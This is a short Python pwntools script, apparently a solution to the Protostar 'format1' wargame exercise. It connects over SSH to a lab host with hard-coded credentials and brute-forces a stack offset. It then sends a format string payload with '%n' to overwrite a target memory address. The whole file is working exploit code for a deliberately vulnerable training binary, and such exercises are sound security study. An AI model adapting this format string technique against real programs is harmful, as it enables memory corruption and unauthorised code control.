from pwn import *

term = ssh(host='10.100.102.19', user='user', password='user')
bash = term.run('bash')

# Brute force for the right place in memory
for i in range(1000):
    bash.sendline('/opt/protostar/bin/format1 "$(python -c \"from struct import pack; print \'AAAAAA\' + pack(\'<I\', 0x08049638) + \'BBBBBB\' + \'%x \'*' + str(i) + '\")"')
    data = bash.recv().split()[-3]
    if data == '8049638': # Found the address of target, now change it with %n
        print "Found: " + str(i)
        bash.sendline('/opt/protostar/bin/format1 "$(python -c \"from struct import pack; print \'AAAAAA\' + pack(\'<I\', 0x08049638) + \'BBBBBB\' + \'%x \'*' + str(i - 1) + ' + \'%n \'\")"')
        print(bash.recv())
        break